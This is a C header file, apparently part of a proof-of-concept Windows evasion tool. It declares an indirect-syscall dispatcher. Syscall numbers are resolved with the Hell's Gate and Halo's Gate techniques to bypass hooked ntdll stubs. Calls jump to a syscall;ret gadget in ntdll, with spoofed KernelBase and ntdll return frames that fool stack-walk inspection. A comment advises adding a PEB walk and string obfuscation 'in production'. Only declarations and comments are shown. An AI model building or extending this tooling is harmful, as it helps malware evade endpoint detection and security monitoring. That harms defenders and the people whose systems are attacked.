#pragma once
#include <windows.h>
#include <stdint.h>

/*
 * PoC note: this file uses GetModuleHandleA/GetProcAddress for simplicity.
 * In production, replace with a PEB walk and EVS XOR string obfuscation.
 */

/*
 * Pointers used by spoof_stub.S — must be initialized by sc_init().
 *   sc_gadget : syscall;ret sequence inside ntdll .text
 *   sc_frame1 : single `ret` in KernelBase .text (inner spoof frame)
 *   sc_frame2 : single `ret` in ntdll .text     (outer spoof frame)
 */
extern void *sc_gadget;
extern void *sc_frame1;
extern void *sc_frame2;

/*
 * sc_init() — find gadgets, must be called once before sc_ssn/sc_call.
 * Returns 0 on success, -1 if ntdll has no syscall;ret sequence.
 */
int sc_init(void);

/*
 * sc_ssn(name) — resolve the syscall number for an Nt* function.
 *
 * Hell's Gate  : stub starts with `4C 8B D1 B8 xx xx` → read SSN directly.
 * Halo's Gate  : stub hooked (JMP trampoline) → walk EAT for a clean neighbor,
 *                then compute SSN by adjusting the neighbor's SSN by the delta.
 *
 * Returns 0xFFFF on failure.
 */
uint16_t sc_ssn(const char *name);

/*
 * sc_call(ssn, a1..a11) — indirect syscall dispatcher.
 *
 * - Jumps to a `syscall;ret` gadget inside ntdll .text (not our own code).
 * - Pushes two fake return addresses onto the stack before the jmp:
 *     [rsp+0x00] = sc_frame1 (ret in KernelBase .text)
 *     [rsp+0x08] = sc_frame2 (ret in ntdll .text)
 *   Stack walk during the syscall shows: Nt* → KernelBase → ntdll → caller.
 * - Remaps arguments to Windows Nt* ABI (r10=a1, rdx=a2, r8=a3, r9=a4,
 *   a5..a11 on stack at [rsp+0x28..]).
 *
 * Caller must zero unused trailing args.
 */
extern NTSTATUS sc_call(uint16_t ssn,
                        uintptr_t a1,  uintptr_t a2,  uintptr_t a3,
                        uintptr_t a4,  uintptr_t a5,  uintptr_t a6,
                        uintptr_t a7,  uintptr_t a8,  uintptr_t a9,
                        uintptr_t a10, uintptr_t a11);
